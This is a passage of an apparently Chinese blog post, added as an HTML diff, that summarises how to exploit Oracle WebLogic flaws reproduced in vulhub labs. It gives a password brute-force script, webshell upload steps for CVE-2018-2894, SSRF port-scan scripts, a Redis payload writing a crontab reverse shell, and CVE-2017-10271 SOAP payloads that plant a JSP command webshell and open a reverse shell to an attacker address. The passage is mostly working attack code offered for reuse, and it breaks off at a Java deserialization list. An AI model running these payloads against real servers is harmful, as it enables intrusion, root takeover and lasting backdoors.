@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html>
+  <!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  
+  <title>weblogic漏洞总结 - LionTree</title>
+  <link rel="icon" href="https://i.imgur.com/SrZt9VU.jpg" type="image/x-icon">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+  
+  <meta name="keywords" content=weblogic>
+  
+  
+  
+    <link rel="alternate" href="/atom.xml " title="LionTree" type="application/atom+xml">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+  <body>
+    <div class="container">
+      <header class="header">
+  <div class="blog-title">
+    <a href="/" class="logo">LionTree</a>
+    <div class="subtitle"></div>
+  </div>
+  <nav class="navbar">
+    <ul class="menu">
+      
+        <li class="menu-item">
+          <a href="/" class="menu-item-link">Home</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/summary" class="menu-item-link">Summary</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/about" class="menu-item-link">About</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/atom.xml" class="menu-item-link">RSS</a>
+        </li>
+      
+    </ul>
+  </nav>
+</header>
+
+<article class="post">
+  <div class="post-title">
+    <h1 class="article-title">weblogic漏洞总结</h1>
+  </div>
+
+  <!-- 文章目录 -->
+  <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#弱口令"><span class="toc-text">弱口令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-弱口令爆破"><span class="toc-text">1.弱口令爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-上传war-webshell"><span class="toc-text">2.上传war webshell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#任意文件上传-CVE-2018-2894"><span class="toc-text">任意文件上传 CVE-2018-2894</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-开启Web服务测试页"><span class="toc-text">1.开启Web服务测试页</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-更改工作目录"><span class="toc-text">2.更改工作目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-config-do上传"><span class="toc-text">3.config.do上传</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-begin-do上传"><span class="toc-text">4.begin.do上传</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-invoke上传"><span class="toc-text">5.invoke上传</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-原理分析"><span class="toc-text">6.原理分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF-CVE-2014-4210"><span class="toc-text">SSRF CVE-2014-4210</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-内网端口扫描"><span class="toc-text">1.内网端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-利用redis反弹shell"><span class="toc-text">2.利用redis反弹shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XML-Decoder-反序列化"><span class="toc-text">XML Decoder 反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2017-10271"><span class="toc-text">CVE-2017-10271</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-写入webshell"><span class="toc-text">1.写入webshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-反弹shell"><span class="toc-text">2.反弹shell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#java反序列化"><span class="toc-text">java反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2018-2628"><span class="toc-text">CVE-2018-2628</span></a></li></ol></li></ol>
+
+  <div class="post-content">
+    <h2 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h2><p>vulhub环境:<a href="https://github.com/vulhub/vulhub/tree/master/weblogic/weak_password" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/weblogic/weak_password</a></p>
+<h3 id="1-弱口令爆破"><a href="#1-弱口令爆破" class="headerlink" title="1.弱口令爆破"></a>1.弱口令爆破</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://127.0.0.1"</span></span><br><span class="line">pwddict = [<span class="string">'WebLogic'</span>, <span class="string">'weblogic'</span>, <span class="string">'Oracle@123'</span>, <span class="string">'password'</span>, <span class="string">'system'</span>, <span class="string">'Administrator'</span>, <span class="string">'admin'</span>, <span class="string">'security'</span>, <span class="string">'joe'</span>, <span class="string">'wlcsystem'</span>, <span class="string">'wlpisystem'</span>]</span><br><span class="line"><span class="keyword">for</span> user <span class="keyword">in</span> pwddict:</span><br><span class="line">    <span class="keyword">for</span> pwd <span class="keyword">in</span> pwddict:</span><br><span class="line">        data = &#123;</span><br><span class="line">                <span class="string">'j_username'</span>:user,</span><br><span class="line">                <span class="string">'j_password'</span>:pwd,</span><br><span class="line">                <span class="string">'j_character_encoding'</span>:<span class="string">'UTF-8'</span></span><br><span class="line">                &#125;</span><br><span class="line">        req = requests.post(url+<span class="string">':7001/console/j_security_check'</span>, data=data, allow_redirects=<span class="literal">False</span>, verify=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> req.status_code == <span class="number">302</span> <span class="keyword">and</span> <span class="string">'console'</span> <span class="keyword">in</span> req.text <span class="keyword">and</span> <span class="string">'LoginForm.jsp'</span> <span class="keyword">not</span> <span class="keyword">in</span> req.text:</span><br><span class="line">            print(<span class="string">'[+] WebLogic username: '</span>+user+<span class="string">'  password: '</span>+pwd)</span><br></pre></td></tr></table></figure>
+<p>可以用这个脚本进行弱口令爆破</p>
+<h3 id="2-上传war-webshell"><a href="#2-上传war-webshell" class="headerlink" title="2.上传war webshell"></a>2.上传war webshell</h3><p>首先准备好war包，把一个jsp网马压缩成zip格式，然后把后缀名改成war        </p>
+<p>登录后打开左边的部署，选择安装,上载文件<br>在部署档案上传war包，然后不断下一步(注意选上面那一个下一步)<br>填好部署名称后完成并保存<br>最后访问/[部署名称]/xx.jsp拿到webshell</p>
+<h2 id="任意文件上传-CVE-2018-2894"><a href="#任意文件上传-CVE-2018-2894" class="headerlink" title="任意文件上传 CVE-2018-2894"></a>任意文件上传 CVE-2018-2894</h2><blockquote>
+<p>涉及版本：10.3.6.0，12.1.3.0，12.2.1.2，12.2.1.3 </p>
+</blockquote>
+<p>这个洞在vulhub上有环境:<br><a href="https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2018-2894" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2018-2894</a></p>
+<p>这里记录下复现的过程：</p>
+<h3 id="1-开启Web服务测试页"><a href="#1-开启Web服务测试页" class="headerlink" title="1.开启Web服务测试页"></a>1.开启Web服务测试页</h3><p>看其他的文章都有提到该漏洞需要开启测试模式，但我测试时似乎没什么影响…<br>打开的方法是登录后在左侧base_domain的高级中选择启用 Web 服务测试页       </p>
+<h3 id="2-更改工作目录"><a href="#2-更改工作目录" class="headerlink" title="2.更改工作目录"></a>2.更改工作目录</h3><p>首先在<br><a href="http://your-ip:7001/ws_utc/config.do" target="_blank" rel="noopener">http://your-ip:7001/ws_utc/config.do</a><br>中更改工作目录,比如改成<br>/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/<br>com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css         </p>
+<p>之所以要做这个操作，是因为默认的工作目录无法用url访问到。   </p>
+<p><a href="http://blog.sina.com.cn/s/blog_1574497330102xkf1.html" target="_blank" rel="noopener">http://blog.sina.com.cn/s/blog_1574497330102xkf1.html</a><br>讲了利用目录穿越上传包的方法，可以不用改工作目录</p>
+<h3 id="3-config-do上传"><a href="#3-config-do上传" class="headerlink" title="3.config.do上传"></a>3.config.do上传</h3><p>还是在config.do,在左边的安全那里添加keystore，<br>上传的时候用bp看respone里有个时间戳，类似</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;id&gt;1560876100810&lt;&#x2F;id&gt;</span><br></pre></td></tr></table></figure>
+<p>然后访问<a href="http://your-ip:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]" target="_blank" rel="noopener">http://your-ip:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]</a></p>
+<p>拿到webshell</p>
+<h3 id="4-begin-do上传"><a href="#4-begin-do上传" class="headerlink" title="4.begin.do上传"></a>4.begin.do上传</h3><p>访问<a href="http://127.0.0.1:7001/ws_utc/begin.do" target="_blank" rel="noopener">http://127.0.0.1:7001/ws_utc/begin.do</a><br>在右上方导入测试用例，他会报个错但其实已经上传成功了，上传的时候抓包在response里搜索上传的文件名就可以看到上传路径</p>
+<h3 id="5-invoke上传"><a href="#5-invoke上传" class="headerlink" title="5.invoke上传"></a>5.invoke上传</h3><p>其实上面begin.do上传的时候抓包可以看到真正存在漏洞的是  /ws_utc/resources/ws/config/import?timestamp=<br>但import是需要开启测试模式的(然而我测试却成功了..)，而另一个接口<br>/ws_utc/resources/ws/invoke?timestamp=<br>是不需要测试模式的<br>所以只要在begin.do上传时抓包改成<br>/ws_utc/resources/ws/invoke?timestamp=<br>就可以在生产模式进行利用，不过这个方法的response中没有上传后的路径，上传后文件所在路径和beigin.do上传是一样的</p>
+<h3 id="6-原理分析"><a href="#6-原理分析" class="headerlink" title="6.原理分析"></a>6.原理分析</h3><p>参加一些大佬的文章:<br><a href="https://blog.riskivy.com/weblogic-cve-2018-2894/#0x03" target="_blank" rel="noopener">https://blog.riskivy.com/weblogic-cve-2018-2894/#0x03</a><br><a href="https://xz.aliyun.com/t/2458#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/2458#toc-3</a><br><a href="https://www.freebuf.com/vuls/178510.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/178510.html</a></p>
+<h2 id="SSRF-CVE-2014-4210"><a href="#SSRF-CVE-2014-4210" class="headerlink" title="SSRF CVE-2014-4210"></a>SSRF CVE-2014-4210</h2><blockquote>
+<p>涉及版本：10.0.2，10.3.6</p>
+</blockquote>
+<p>vulhub上的环境：<a href="https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf</a><br>一个利用该漏洞探测内网网段，端口扫描，反弹shell的脚本:<a href="https://github.com/NoneNotNull/SSRFX" target="_blank" rel="noopener">https://github.com/NoneNotNull/SSRFX</a></p>
+<h3 id="1-内网端口扫描"><a href="#1-内网端口扫描" class="headerlink" title="1.内网端口扫描"></a>1.内网端口扫描</h3><p>ssrf存在于/uddiexplorer/SearchPublicRegistries.jsp         </p>
+<p>访问</p>
+<blockquote>
+<p><a href="http://you-ip:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:7001" target="_blank" rel="noopener">http://you-ip:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:7001</a></p>
+</blockquote>
+<p>即可对该服务器的7001端口进行扫描            </p>
+<ul>
+<li>可访问的端口会返回status code，如<blockquote>
+<p>The server at <a href="http://127.0.0.1:7001" target="_blank" rel="noopener">http://127.0.0.1:7001</a> returned a 404 error code (Not Found). </p>
+</blockquote>
+</li>
+<li>不可访问的端口会返回Tried all: ‘1’ addresses, but could not connect over HTTP to server</li>
+<li>其他情况参见<a href="http://zone.secevery.com/question/121" target="_blank" rel="noopener">http://zone.secevery.com/question/121</a></li>
+</ul>
+<p>一个简单的判断方法是若目标主机存活，当返回的信息中含有’Tried all’时，该端口就是关闭的,可以用以下脚本进行端口扫描(这些都可以用上面那个SSRFX完成)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">result = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10000</span>):</span><br><span class="line">    print(i)</span><br><span class="line">    url = <span class="string">"http://127.0.0.1:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://172.20.0.2:&#123;port&#125;"</span>.format(port=i)</span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"Tried all"</span> <span class="keyword">in</span> str(r.content):</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(str(i) + <span class="string">" is open"</span>)</span><br><span class="line">        result.append(str(i))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> result:</span><br><span class="line">    print(<span class="string">"[FIND]port:-------------------------------"</span>+i)</span><br></pre></td></tr></table></figure>
+
+<p>左边的Setup UDDI Explorer可能会泄漏内网网段<br>获取内网网段后，可以用这个脚本扫描内网机器的常见端口</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">ip_head = <span class="string">"172.20.0."</span></span><br><span class="line">ports = (<span class="string">'21'</span>, <span class="string">'22'</span>, <span class="string">'23'</span>, <span class="string">'53'</span>, <span class="string">'80'</span>, <span class="string">'135'</span>, <span class="string">'139'</span>, <span class="string">'443'</span>, <span class="string">'445'</span>, <span class="string">'1080'</span>, <span class="string">'1433'</span>, <span class="string">'1521'</span>, <span class="string">'3306'</span>, <span class="string">'3389'</span>, <span class="string">'4899'</span>, <span class="string">'8080'</span>, <span class="string">'7001'</span>, <span class="string">'8000'</span>,<span class="string">'6389'</span>,<span class="string">'6379'</span>)</span><br><span class="line">result=[]</span><br><span class="line"><span class="keyword">for</span> ip_tail <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">    result.clear()</span><br><span class="line">    ip = ip_head + str(ip_tail)</span><br><span class="line">    url1 = <span class="string">"http://127.0.0.1:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://"</span>+ ip</span><br><span class="line">    print(<span class="string">"ip:&#123;ip&#125;"</span>.format(ip=ip))</span><br><span class="line">    <span class="keyword">for</span> port <span class="keyword">in</span> ports:</span><br><span class="line">        url2 = url1+<span class="string">":&#123;port&#125;"</span>.format(port=port)</span><br><span class="line">        r = requests.get(url2)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"No route to host"</span> <span class="keyword">in</span> str(r.content):</span><br><span class="line">            print(ip+<span class="string">" unreachble"</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">"Tried all"</span> <span class="keyword">in</span> str(r.content):</span><br><span class="line">            print(port)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(str(port) + <span class="string">" is open"</span>)</span><br><span class="line">            result.append(str(port))</span><br><span class="line">    print(<span class="string">"---------------------------------------------"</span>)</span><br></pre></td></tr></table></figure>
+<h3 id="2-利用redis反弹shell"><a href="#2-利用redis反弹shell" class="headerlink" title="2.利用redis反弹shell"></a>2.利用redis反弹shell</h3><p>vulhub上的示例，利用内网中存在的redis反弹shell  </p>
+<p>这里找到redis服务器172.20.0.2，开放6379端口<br>向redis服务器发送三条redis命令，将弹shell的脚本写入/etc/contrab</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set 1 &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;172.18.0.1&#x2F;21 0&gt;&amp;1\n\n\n\n&quot;</span><br><span class="line">config set dir &#x2F;etc&#x2F;</span><br><span class="line">config set dbfilename crontab</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+<p>redis命令的换行符是\r\n,url编码为%0D%0A,三条命令进行url编码后为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.18.0.1%2F21%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa</span><br></pre></td></tr></table></figure>
+<p>在本机上用nc监听</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nc -l -p 21</span><br></pre></td></tr></table></figure>
+<p>访问</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;you-ip:7001&#x2F;uddiexplorer&#x2F;SearchPublicRegistries.jsp?rdoSearch&#x3D;name&amp;txtSearchname&#x3D;sdf&amp;txtSearchkey&#x3D;&amp;txtSearchfor&#x3D;&amp;selfor&#x3D;Business+location&amp;btnSubmit&#x3D;Search&amp;operator&#x3D;http:&#x2F;&#x2F;172.20.0.2:6379&#x2F;test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.18.0.1%2F21%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa</span><br></pre></td></tr></table></figure>
+<p>得到root权限的shell     </p>
+<p>最后补充一下，可进行利用的cron有如下几个地方：  </p>
+<ul>
+<li>/etc/crontab 这个是肯定的</li>
+<li>/etc/cron.d/* 将任意文件写到该目录下，效果和crontab相同，格式也要和/etc/crontab相同。漏洞利用这个目录，可以做到不覆盖任何其他文件的情况进行弹shell。</li>
+<li>/var/spool/cron/root centos系统下root用户的cron文件</li>
+<li>/var/spool/cron/crontabs/root debian系统下root用户的cron文件</li>
+</ul>
+<h2 id="XML-Decoder-反序列化"><a href="#XML-Decoder-反序列化" class="headerlink" title="XML Decoder 反序列化"></a>XML Decoder 反序列化</h2><ul>
+<li>CVE-2017-3506</li>
+<li>CVE-2017-10271</li>
+<li>CVE-2019-2725<br>涉及版本:<blockquote>
+<p>10.3.6.0，12.1.3.0，12.2.1.1，12.2.1.2 </p>
+</blockquote>
+</li>
+</ul>
+<p>详细的原理分析：<a href="https://www.freebuf.com/vuls/206374.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/206374.html</a></p>
+<p>Oracle给CVE-2017-3506提供的补丁只禁止了&lt;object&gt;标签，因为VoidElementHandler 是 ObjectElementHandler 类的子类，所以&lt;void&gt;同样可以命令执行，造成了CVE-2017-10271。<br>最新的CVE-2019-2725则是爆出了新的存在反序列化的组件_async并且 CVE-2017-10271 的补丁被绕过</p>
+<p>这里只复现了CVE-2017-10271</p>
+<h3 id="CVE-2017-10271"><a href="#CVE-2017-10271" class="headerlink" title="CVE-2017-10271"></a>CVE-2017-10271</h3><h4 id="1-写入webshell"><a href="#1-写入webshell" class="headerlink" title="1.写入webshell"></a>1.写入webshell</h4><p>webshell放在&lt;![CDATA[和]]&gt;之间</p>
+<p>bp提交</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;wls-wsat&#x2F;CoordinatorPortType HTTP&#x2F;1.1</span><br><span class="line">Host: your-ip:7001</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text&#x2F;xml</span><br><span class="line">Content-Length: 982</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv&#x3D;&quot;http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;soap&#x2F;envelope&#x2F;&quot;&gt;</span><br><span class="line">    &lt;soapenv:Header&gt;</span><br><span class="line">    &lt;work:WorkContext xmlns:work&#x3D;&quot;http:&#x2F;&#x2F;bea.com&#x2F;2004&#x2F;06&#x2F;soap&#x2F;workarea&#x2F;&quot;&gt;</span><br><span class="line">    &lt;java&gt;&lt;java version&#x3D;&quot;1.4.0&quot; class&#x3D;&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">    &lt;object class&#x3D;&quot;java.io.PrintWriter&quot;&gt; </span><br><span class="line">    &lt;string&gt;servers&#x2F;AdminServer&#x2F;tmp&#x2F;_WL_internal&#x2F;bea_wls_internal&#x2F;9j4dqk&#x2F;war&#x2F;test.jsp&lt;&#x2F;string&gt;</span><br><span class="line">    &lt;void method&#x3D;&quot;println&quot;&gt;&lt;string&gt;</span><br><span class="line">     &lt;![CDATA[</span><br><span class="line">         &lt;%if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;</span><br><span class="line">        java.io.InputStream in &#x3D; Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();</span><br><span class="line">        int a &#x3D; -1;</span><br><span class="line">        byte[] b &#x3D; new byte[2048];</span><br><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        while((a&#x3D;in.read(b))!&#x3D;-1)&#123;</span><br><span class="line">            out.println(new String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;&lt;&#x2F;pre&gt;&quot;);</span><br><span class="line">        &#125; %&gt;</span><br><span class="line">    ]]&gt;</span><br><span class="line">    &lt;&#x2F;string&gt;</span><br><span class="line">    &lt;&#x2F;void&gt;</span><br><span class="line">    &lt;void method&#x3D;&quot;close&quot;&#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;object&gt;&lt;&#x2F;java&gt;&lt;&#x2F;java&gt;</span><br><span class="line">    &lt;&#x2F;work:WorkContext&gt;</span><br><span class="line">    &lt;&#x2F;soapenv:Header&gt;</span><br><span class="line">    &lt;soapenv:Body&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure>
+<p>然后访问<a href="http://your-ip:7001/bea_wls_internal/test.jsp?pwd=023&amp;i=ls" target="_blank" rel="noopener">http://your-ip:7001/bea_wls_internal/test.jsp?pwd=023&amp;i=ls</a><br>可以看到ls执行成功</p>
+<h4 id="2-反弹shell"><a href="#2-反弹shell" class="headerlink" title="2.反弹shell"></a>2.反弹shell</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nc -l -p 21</span><br></pre></td></tr></table></figure>
+<p>本机监听21端口<br>然后bp提交</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;wls-wsat&#x2F;CoordinatorPortType HTTP&#x2F;1.1</span><br><span class="line">Host: your-ip:7001</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text&#x2F;xml</span><br><span class="line">Content-Length: 633</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv&#x3D;&quot;http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;soap&#x2F;envelope&#x2F;&quot;&gt; &lt;soapenv:Header&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work&#x3D;&quot;http:&#x2F;&#x2F;bea.com&#x2F;2004&#x2F;06&#x2F;soap&#x2F;workarea&#x2F;&quot;&gt;</span><br><span class="line">&lt;java version&#x3D;&quot;1.4.0&quot; class&#x3D;&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">&lt;void class&#x3D;&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">&lt;array class&#x3D;&quot;java.lang.String&quot; length&#x3D;&quot;3&quot;&gt;</span><br><span class="line">&lt;void index&#x3D;&quot;0&quot;&gt;</span><br><span class="line">&lt;string&gt;&#x2F;bin&#x2F;bash&lt;&#x2F;string&gt;</span><br><span class="line">&lt;&#x2F;void&gt;</span><br><span class="line">&lt;void index&#x3D;&quot;1&quot;&gt;</span><br><span class="line">&lt;string&gt;-c&lt;&#x2F;string&gt;</span><br><span class="line">&lt;&#x2F;void&gt;</span><br><span class="line">&lt;void index&#x3D;&quot;2&quot;&gt;</span><br><span class="line">&lt;string&gt;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;172.19.0.1&#x2F;21 0&gt;&amp;1&lt;&#x2F;string&gt;</span><br><span class="line">&lt;&#x2F;void&gt;</span><br><span class="line">&lt;&#x2F;array&gt;</span><br><span class="line">&lt;void method&#x3D;&quot;start&quot;&#x2F;&gt;&lt;&#x2F;void&gt;</span><br><span class="line">&lt;&#x2F;java&gt;</span><br><span class="line">&lt;&#x2F;work:WorkContext&gt;</span><br><span class="line">&lt;&#x2F;soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure>
+<p>获得shell<br>注意</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;string&gt;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;172.19.0.1&#x2F;21 0&gt;&amp;1&lt;&#x2F;string&gt;</span><br></pre></td></tr></table></figure>
+<p>这里必须要用html字符实体编码，否则解析XML的时候将出现格式错误</p>
+<h2 id="java反序列化"><a href="#java反序列化" class="headerlink" title="java反序列化"></a>java反序列化</h2><ul>
+<li>CVE-2015-4852  </li>
+<li>CVE-2016-0638  </li>
